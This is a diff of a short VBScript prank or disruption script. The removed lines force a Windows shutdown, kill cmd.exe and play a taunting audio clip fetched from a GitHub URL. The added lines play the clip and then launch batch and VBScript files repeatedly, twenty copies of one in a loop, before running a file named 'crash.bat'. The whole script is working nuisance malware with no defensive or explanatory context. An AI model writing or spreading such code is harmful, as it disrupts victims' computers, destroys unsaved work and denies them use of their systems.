@@ -1,14 +1,17 @@
-Dim objShell
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "C:\WINDOWS\system32\shutdown.exe /s /f /t 20 /c "" """
-Dim oPlayer
-Set oPlayer = CreateObject("WMPlayer.OCX")
-oPlayer.URL = "https://raw.githubusercontent.com/p6c/a/main/gottem.mp3"
-oPlayer.controls.play
-objShell.Run "C:\WINDOWS\system32\taskkill.exe /im cmd.exe"
-While oPlayer.playState <> 1 ' 1 = Stopped
-  WScript.Sleep 100
-Wend
-
-' Release the audio file
-oPlayer.close
+Dim os
+Set os = WScript.CreateObject("WScript.Shell")
+Dim op
+Set op = CreateObject("WMPlayer.OCX")
+op.URL = "https://raw.githubusercontent.com/p6c/a/main/gottem.mp3"
+op.controls.play
+WScript.Sleep 17000
+os.run "c.bat"
+os.run "c.bat"
+os.run "c.bat"
+os.run "c.bat"
+Dim i
+For i = 1 To 20
+os.run "b.vbs"
+Next
+WScript.Sleep 1000
+os.run "crash.bat"
